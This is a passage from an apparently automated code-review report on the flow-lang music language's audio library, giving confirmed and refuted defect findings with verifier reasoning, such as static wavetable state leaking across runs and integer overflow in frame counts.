Concrete failure #1 (single-render correctness): fresh process, script registers a custom oscillator named "warm" then renders it as the first render — the built-in "warm" table silently replaces the composer's waveform, so the wrong timbre plays with no diagnostic.

Concrete failure #2 (determinism, D-48-16): within one process (WASM run() #2, live-reload, or a second FlowEngine), the static `_builtinVariantsRegistered` is already 1, so EnsureBuiltin no-ops and the composer's "warm" survives on run 2. Identical source therefore renders built-in warm on run 1 and custom warm on run 2 — a latent two-run cmp-clean violation, gated behind the name collision.

Severity medium: genuinely reachable, silent (no advisory/error), and violates a locked determinism contract, but the trigger surface is narrow — the composer must use one of exactly three reserved names AND register it before the process's first render, on an advanced/rarely-used custom-wavetable feature.

</details>

### 12. [MEDIUM] flow-lang/StandardLibrary/Audio/NoteSynthesizer.cs:255

**SynthesizerFactory._customWavetables is process-global static state that is never cleared per FlowEngine/render, so custom oscillators leak across unrelated scripts.**

Failure scenario: _customWavetables is a static Dictionary with no per-engine scoping and no reset at render/engine boundary. Create() checks this dict BEFORE the built-in switch (line 307), so a composer name collides with and shadows any built-in. In a process that serves multiple scripts (WASM flow-runtime.js run() is called many times on one Mono-WASM process; also flow watch live reload; also the xUnit suite), run A doing `(oscillator "piano" buzzFn)` or `(oscillator "sine" myFn)` permanently replaces the built-in piano/sine synthesizer for every later run B in the same process — run B's `renderSong s "piano"` renders run A's buzz table instead of PianoSynthesizer. Render output thus depends on which scripts ran earlier in the process, violating run isolation and the same-process determinism expectation.

Fix sketch: Scope the custom-wavetable registry per FlowEngine (e.g. carry it on ExecutionContext / the SampleCache that Create already receives) instead of a static Dictionary, or clear/snapshot it at each render boundary the way PrngRegistry.ResetAtRenderBoundary does.

<details><summary>Verifier reasoning</summary>

CONFIRMED and reachable. `SynthesizerFactory._customWavetables` (NoteSynthesizer.cs:255) is a process-global static Dictionary written by `RegisterWavetable` (:279) and read in `Create()` at :307 BEFORE the built-in switch (:310). It is referenced at exactly three sites (255/279/307) — grep confirms no `.Clear()`/reset anywhere, and neither FlowEngine's ctor nor Dispose touches it.

The composer path is unguarded: the `oscillator` builtin (BuiltInFunctions.cs:1186/1283/1296) takes a raw string `name` with zero validation against built-in names, so `(oscillator "piano" buzzFn)` writes `_customWavetables["piano"]`. It is not FLOW_WEB-stripped, so it is live in the WASM playground. `renderSong s "piano"` flows the raw string through SongRenderer.cs:199 → :248 RenderSection → :382 Create("piano"), which at :307 finds the custom entry and returns `WavetableSynthesizer(buzzTable)` instead of `PianoSynthesizer`.

The reset that DOES exist proves the intent and the gap: WasmEntry.NewEngineForRun (WasmEntry.cs:205-217) deliberately builds a fresh FlowEngine per run() to isolate the "edit → click Run again" playground loop (clean GlobalFrame + empty SectionRegistry), but rebuilds only engine-owned state — the static `_customWavetables` escapes that isolation. So run A's `(oscillator "piano" ...)` permanently poisons run B's `renderSong ... "piano"` in the same Mono-WASM process (also REPL, flow watch, xUnit suite). A non-colliding variant is also real: run A defines "mybuzz", run B that never defined it renders successfully with A's stale table instead of throwing "Unknown synthesizer type".

Not house-style charity: no advisory, no safe fallback — it silently substitutes a different synthesizer, directly contradicting the documented run-isolation intent and producing wrong audio that depends on prior runs. Nothing upstream prevents it.

Severity capped at medium: affects only long-lived processes (WASM playground / REPL / watch / tests — fresh Desktop-CLI runs are immune), requires the niche `oscillator` feature, and yields silently-wrong audio rather than a crash or hard determinism-contract break (a given source run twice consecutively can still be byte-identical). Still a genuine run-isolation/fidelity defect worth fixing (e.g., make the wavetable registry engine-scoped or clear it at the render/engine boundary).

</details>

### 13. [LOW] flow-lang/StandardLibrary/Audio/Timeline.cs:256

**Voice and track pan are combined by averaging, so a fully-panned track never reaches hard L/R and the combination is inconsistent with the codebase's additive-with-clamp convention**

Failure scenario: `track -> withPan 1.0` on a track whose voices keep the default Voice.Pan=0. In CalculatePanGain, totalPan=(0+1.0)/2=0.5, so the track pans only halfway right despite the composer requesting hard right. Symmetrically, a voice set to Pan=1.0 on a center track only reaches 0.5. Everywhere else in the codebase per-source and per-container pan combine additively-with-clamp (SFZ: `clamp(region.Pan+voice.Pan,-1,+1)`); averaging here means neither the track control nor the voice control can independently reach full pan.

Fix sketch: Combine additively with clamp: `totalPan = Math.Clamp(voicePan + trackPan, -1.0, 1.0)` to match the rest of the codebase and let a single control reach hard L/R.

<details><summary>Verifier reasoning</summary>

The failure scenario survives every refutation attempt. CalculatePanGain (Timeline.cs:256) combines voice and track pan by averaging: totalPan = (voicePan + trackPan) / 2.0. The path is fully reachable and represents the typical usage: createStereoTrack (composition.flow:104) makes channels=2, createVoice leaves Voice.Pan at its 0.0 default (Voice.cs:52), and withPan(Track, 1.0) (composition.flow:148 → setTrackPan → Timeline.cs:183) sets Track.Pan=1.0. RenderTrack invokes CalculatePanGain on both the stereo path (Timeline.cs:224-226) and the mono→stereo duplicate path (Timeline.cs:239), so pan is applied.

With track.Pan=1.0 and the default voice.Pan=0, totalPan=0.5. The equal-power formula then yields left gain = cos(1.5·π/4) ≈ 0.383 and right gain = sin(1.5·π/4) ≈ 0.924 — the left channel keeps ~38% of the signal even though the composer requested hard right via withPan 1.0. Hard L/R (left=0) is unreachable unless BOTH the track knob and every voice knob are simultaneously maxed; neither control can independently reach its own documented extreme. The scenario is symmetric for voice.Pan=1.0 on a centered track.

This is not house-style charity: there is no stderr advisory and no documentation asserting an averaging model (the `// (average)` comment merely restates the code). It directly contradicts the codebase's documented additive-with-clamp convention (SFZ effectivePan = clamp(region.Pan + voice.Pan, -1, +1); MIX-01/02 OQ4 LOCK), under which the same inputs would give clamp(0+1.0)=1.0 → true hard right. The Timeline layer is "legacy" but explicitly retained as a usable manual-mixing surface and is fully registered (BuiltInFunctions.cs:1150,1156) and surfaced in composition.flow, so it is live composer-facing code.

Severity lowered to low: the effect is purely perceptual (pans are milder than requested — no crash, no data corruption), it is deterministic (pure arithmetic, so no two-run/offline-render determinism violation), and it lives on the superseded legacy Timeline path rather than the canonical SongRenderer path. But it is a genuine correctness/consistency defect: a documented composer-facing control (withPan) does not do what its [-1,1] value range implies.

</details>

### 14. [LOW] flow-lang/StandardLibrary/Composition/PolyrhythmFunctions.cs:43

**Large explicit totalBeats override overflows the Int32 frame count and throws instead of clamping charitably.**

Failure scenario: `(polyrhythm a b 100000)` with any non-empty sequences: totalBeats=100000 flows into SongRenderer.MixVoicesToStereoBuffer (called at line 78), which computes `totalFrames = (int)(totalBeats * (60/120) * 44100)` = (int)(2.205e9). That exceeds Int32.MaxValue (2.147e9), the double→int cast wraps to a negative value, and `new AudioBuffer(negativeFrames,...)` throws ArgumentException ("Frame count cannot be negative"). LoopVoices also spins ~25000 reps allocating voice copies first. A composer passing a big beat count gets an unhandled crash rather than the house-standard clamp+advisory.

Fix sketch: Clamp/validate totalBeats (and reps) to a sane ceiling with a one-shot [polyrhythm] advisory before rendering; guard the int-frame computation against overflow.

<details><summary>Verifier reasoning</summary>

CONFIRMED (with a mechanism correction). The high-level defect is real and reachable: `(polyrhythm a b 100000)` with non-empty sequences reaches PolyrhythmFunctions.cs:78 → SongRenderer.MixVoicesToStereoBuffer with totalBeats=100000, and crashes with an unhandled exception. There is no clamp or advisory anywhere on the explicit-override path (PolyrhythmFunctions.cs:40-43), so this violates the house charitable-interpretation rule (degenerate input should clamp+advise, not throw). The reviewer's SUMMARY ("large totalBeats override overflows the Int32 frame count and throws instead of clamping charitably") is accurate.\n\nHOWEVER, the reviewer's detailed mechanism is wrong on .NET 10. SongRenderer.cs:561 computes `(int)(100000 * 0.5 * 44100)` = `(int)(2.205e9)`. The reviewer assumes this wraps to a negative value and trips the `frames < 0` guard at AudioCore.cs:59 (ArgumentException 'Frame count cannot be negative'). That is legacy .NET Framework behavior. On .NET Core 3.0+ / .NET 10, out-of-range floating-point→integer conversions SATURATE, so the cast yields Int32.MaxValue = 2_147_483_647 (positive). The frames<0 guard is NOT hit; the constructor passes all three guards, then at AudioCore.cs:66 `Data = new float[frames * channels]` computes `2147483647 * 2`, which overflows unchecked int32 arithmetic to -2, and `new float[-2]` throws OverflowException ('Arithmetic operation resulted in an overflow'). So the actual crash is an OverflowException at AudioCore.cs:66, not an ArgumentException at AudioCore.cs:59.\n\nThe verdict is robust to the mechanism: under either conversion semantics an unhandled exception crashes the call, so the failure survives. No upstream guard prevents it (totalBeats flows unchecked from args[2].As<int>()). This is not intentional house-style charity — no try/catch, clamp, or advisory exists on this path.\n\nSeverity lowered to low: the overflow threshold is ~97,391 beats (a >13-hour render at 120bpm); such an input is unrealistic, and moderately-large values well below the threshold would already produce multi-GB buffers that OOM in normal use. It is a genuine robustness/charity gap in a least-tested file, but with negligible real-world impact.

</details>

### 15. [LOW] flow-lang/StandardLibrary/Audio/Vocalization/TtsHook.cs:167

**Crafted WAV headers with channels=0 or bitsPerSample=0 raise an uncaught DivideByZeroException, escaping the documented InvalidOperationException contract**

Failure scenario: LoadWavFromStream trusts header fields. If the TTS/child output declares a PCM fmt chunk with bitsPerSample=0, line 148 computes dataBytes/(0/8) → integer divide-by-zero; if it declares channels=0, line 167 samples.Length/channels → divide-by-zero. RunTts's try/catch only catches Win32Exception (line 78), so a DivideByZeroException propagates raw to the caller instead of the documented InvalidOperationException 'invalid or empty WAV output', crashing rather than reporting a clean error.

Fix sketch: Validate channels>0 and bitsPerSample in {16,24,32} right after parsing the fmt chunk and throw InvalidOperationException, or broaden the catch in RunTts.

<details><summary>Verifier reasoning</summary>

Confirmed reachable and unrefuted. In LoadWavFromStream, the fmt-chunk parser (TtsHook.cs:126-139) validates only audioFormat==1; it reads channels (131) and bitsPerSample (135) with no range/zero check. (1) bitsPerSample=0 with a following data chunk hits line 148: (int)(dataBytes / (bitsPerSample / 8)) — bitsPerSample/8 = 0/8 = 0 (integer division), so dataBytes/0 throws DivideByZeroException, and it fires before ReadSamples so the bit-depth default-case guard (210-212) never runs. (2) channels=0 with valid bitsPerSample (e.g. 16) produces a non-null samples array, passing the null guard at 164, then hits line 167: samples.Length / channels = /0 → DivideByZeroException, before the AudioBuffer constructor at 168. Neither is caught: the sole catch in RunTts is Win32Exception (line 78), and the caller VocalizationFunctions.Tts (line 104) does not wrap it either, so the DivideByZeroException escapes the documented InvalidOperationException contract (lines 36-38). This is not house-style charity — every other invalid-output path throws a clean InvalidOperationException (lines 92/100/106/129/143/165/211); a raw arithmetic exception is neither the documented error nor a charitable advisory+fallback. The WAV is external-process stdout (default espeak-ng, or any program a composer sets via setTtsCommand), so crafted/malformed headers are plausible with no upstream guard. Severity lowered to low: default engines won't emit channels=0/bitsPerSample=0, the consequence is merely a wrong/uncaught exception type (crash) rather than the clean documented error, and there is no data-corruption, determinism, or security-escalation impact.

</details>

## Per-target health summaries

- **midi-clock**: 
- **track-timeline**: 
- **polyrhythm-temporamp**: Both files are single-pass AI-written renderers with thin test coverage, and both share the same architectural weakness: they render at a hardcoded/interpolated BPM and stitch fixed-size per-unit buffers together, which exposes edge cases the mainline SongRenderer path avoids. TempoRampRenderer's per-bar mix-then-concatenate truncates note release tails at every bar boundary (undermining the smooth-ramp purpose), and PolyrhythmFunctions both ignores the ambient tempo stack (fixed 120 BPM) and can overflow the Int32 frame count into an ArgumentException on large explicit beat-count overrides, violating the charitable-never-throw contract. Core interpolation/LCM math is otherwise deterministic and correct for normal inputs; the issues are at the edges (extreme lengths, sustained tails, non-default tempo context).
- **tts-hook**: 
- **flow2midi-scaffold**: Both files are single-commit, near-untested thin wrappers and are mostly sound. ScaffoldEmitter validates piece names against path-traversal chars and explicitly refuses to overwrite an existing .flow (returns false with an error, no data loss), and the `flow new` template uses only real stdlib modules (@std/@audio/@notation) in the canonical section/renderSong/writeWav pattern — nothing indicates it fails to run. The flow2midi verb does NOT itself convert Song/Sequence shapes (it just executes a script that is expected to call writeMidi), so the voice-block/articulation/multi-section drop concern does not apply to it. The one real defect is that flow2midi returns the script's exit code and only warns (not fails) when the Required --output path was never produced, so it can exit 0 on a missing or stale MIDI artifact — a footgun for scripted/CI use.
- **oscillators-wavetable**: OscillatorState.cs and WavetableVariants.cs are individually sound: the phase accumulator wraps to [0,1) every sample in both AdvancePhase and WavetableSynthesizer so there's no unbounded growth or long-render float drift, the linear-interpolation index wrap (idx1=(idx0+1)%tableSize) is correct with no boundary off-by-one, and the additive/pulse tables are deterministic. The composer-lambda oscillator path runs the lambda once at registration (to bake a table), not per-sample, so the flagged reentrancy concern doesn't materialize. The real defects are in the shared SynthesizerFactory static registry these feed into: built-in variants are registered lazily on first Create and clobber a same-named composer oscillator in an order-dependent way that breaks two-run determinism in a shared process, and the static custom-wavetable dictionary is never scoped/reset so custom (and built-in-shadowing) oscillator names leak across unrelated runs.

## Refuted findings (reviewed, judged not real)

- **(midi-clock)** The clock's CancellationTokenSource is never disposed, leaking an OS wait handle per clock instance.
  - Refutation: The code facts are accurate: _cts (line 61) has its Token.WaitHandle materialized at line 228 (master) and 339 (real slave), Stop() calls _cts.Cancel() but never _cts.Dispose(), and there is no _cts.Dispose() path (only the linked pollCts is disposed, at 662). However, the claimed concrete failure — "handle count grows without bound" — does not survive, because the claim's premise that the OS handle "is only released on CancellationTokenSource.Dispose()" is factually wrong.

CancellationToken.WaitHandle lazily allocates a ManualResetEvent whose backing SafeWaitHandle is a SafeHandle with a critical finalizer. When the CancellationTokenSource becomes unreachable, that SafeWaitHandle is finalized by the GC and the OS handle is closed — Dispose() is NOT the only release path; finalization reclaims it non-deterministically.

And after clockStop the MidiClock genuinely becomes unreachable: a running master clock is rooted only by its live background thread's stack (RunMasterLoop on `this`); Stop() cancels the CTS, the while(!_cts.IsCancellationRequested) loop exits, the thread terminates, and that root disappears. The only other reference is the composer's ClockHandle Value — there is no global clock registry (MidiClockFunctions just returns the Value; nothing else roots it). So in the claimed repeated clockMaster/clockSlave→clockStop loop, each stopped clock's CTS is collectible and its wait handle is reclaimed by finalization. Because the interpreter allocates continuously, GCs run regularly and finalization keeps pace; the handle count rises only transiently between collections and is bounded, not unbounded.

The reviewer's point that pollCts is disposed at 662 while _cts is not is a real inconsistency, but that amounts to a "should also Dispose _cts for deterministic cleanup" best-practice/style nit (CA2000-style), not the claimed unbounded OS-handle leak. The specific failure scenario (process handle count growing without bound over a long set) is refuted by SafeHandle finalization.
- **(track-timeline)** RenderTrack mixes voice buffers frame-for-frame ignoring each buffer's SampleRate, so a voice at a different rate than the track plays at the wrong pitch/tempo
  - Refutation: The claimed failure scenario is unreachable with the claimed inputs. The reviewer is correct that RenderTrack (flow-lang/StandardLibrary/Audio/Timeline.cs:211-244) mixes voice buffers frame-for-frame into a result buffer allocated at track.SampleRate (line 202) with no resampling and no voice.Buffer.SampleRate==track.SampleRate check. However, the concrete scenario — "addVoice a buffer loaded via loadWav at 48000 Hz" into a 44100 track — cannot produce a rate mismatch, because loadWav ALWAYS normalizes to 44100 Hz. All three loadWav overloads (FileIO.LoadWav:328, LoadWavSemitones:341, LoadWavRatio:357) route through LoadWavInternal, which at FileIO.cs:502-504 does `if (sampleRate != 44100) buffer = Resample(buffer, 44100);` unconditionally. A 48 kHz WAV comes back as a 44100 Hz buffer (the varispeed overloads change frame count but operate on the already-44100 buffer). This is even the documented contract at BuiltInDocs.cs:133 ("resamples to 44100Hz"). So the voice buffer is 44100 Hz, the track is 44100 Hz, the rates match, and there is no 8.8%-fast/sharp playback. The specific audible symptom the claim asserts ("the 48 kHz clip is replayed ~8.8% fast") does not occur for the claimed inputs — it is prevented upstream by loadWav normalization. The underlying code lacks a SampleRate guard, but the reviewer's stated reachability mechanism (loadWav preserving 48000 Hz) is false, so the concrete failure scenario does not survive.
- **(track-timeline)** Final track mix sums voices additively with no clip guard or over-unity advisory
  - Refutation: The claim is mechanically accurate but is not a defect. Timeline.cs:231 does sum voices additively with no clip guard/advisory, and renderTrack IS reachable from Flow (BuiltInFunctions.cs:1156 + composition.flow:72), so it isn't dead code. However, the defect's core premise — that this is a flag-worthy inconsistency with gain/volume — is a false equivalence that collapses under the correct comparison.

(1) Additive mixing is standard, expected audio behavior: summing independent signals routinely exceeds unity and the composer manages levels (setVoiceGain/setTrackGain/setTrackPan all exist in this same file). This is categorically different from gain/volume, which are per-buffer SCALAR operations where an over-unity result signals a bad user-chosen scalar — hence warn-worthy there.

(2) The relevant peer is the CANONICAL mix path, not gain/volume. SongRenderer (which CLAUDE.md explicitly names as superseding Timeline) mixes voices additively at lines 590-591 and 628-629 with NO final clip guard, NO normalization, and NO over-unity advisory (grep for normalize/clamp/clip in SongRenderer = empty). So Timeline is CONSISTENT with the actual house mixing style; it is not an outlier.

(3) No real harm survives: the WAV encoder cleanly hard-clips via Math.Clamp to int16 range (FileIO.cs:180-194) — no overflow wrap, exactly as the claim concedes. There is no state corruption, no hidden permanent failure, no crash, and no determinism break (fixed-order float summation stays two-run byte-identical). Adding a clip guard in the mix loop would actively distort a legitimately over-unity sum.

The remaining suggestion — 'add an over-unity advisory to mixdowns' — is an enhancement/style nit the prompt explicitly excludes, and it wouldn't even be self-consistent to add it only to the legacy path while the canonical SongRenderer path stays silent. Refuted.
- **(tts-hook)** On timeout, process.Kill() is issued with no following WaitForExit, so the killed child is not reaped
  - Refutation: Refuted. The claimed permanent failure (an unreaped zombie / leaked child) does not survive scrutiny. (1) .NET on Unix reaps child processes it launches via a SIGCHLD-driven ProcessWaitState reaper that operates independently of any WaitForExit call, so the SIGKILL'd child is reaped by the runtime shortly after it dies — the reviewer's own phrasing ("until the runtime happens to reap it") concedes the reap occurs. At most there is a brief transient <defunct> entry, which is normal, not a leak. Because the code throws immediately after Kill() and relies on nothing further from the process, the missing WaitForExit is a best-practice nicety (synchronous reap), not a concrete defect. (2) No accumulation path exists: RunTts is reached only via the one-shot tts(text) composer builtin (VocalizationFunctions.cs:104), not an audio sample hot-path or a live/flow-watch loop, so transient zombies cannot pile up into resource exhaustion. (3) The timeout branch itself is only reachable in an unusual state — the blocking CopyTo on line 61 already waits for stdout EOF (child closing its write handle), so reaching WaitForExit(30000)==false requires the child to close stdout yet stay alive >30s. (4) The grandchildren-orphan sub-claim requires an exotic user-set command (the default espeak-ng --stdout spawns no tree), and orphans are reparented to init and reaped there — normal OS behavior, not a Flow-side leak. (5) The try/catch best-effort Kill plus a precise InvalidOperationException is consistent with house charitable style. No concrete, arguable, user-visible failure survives.
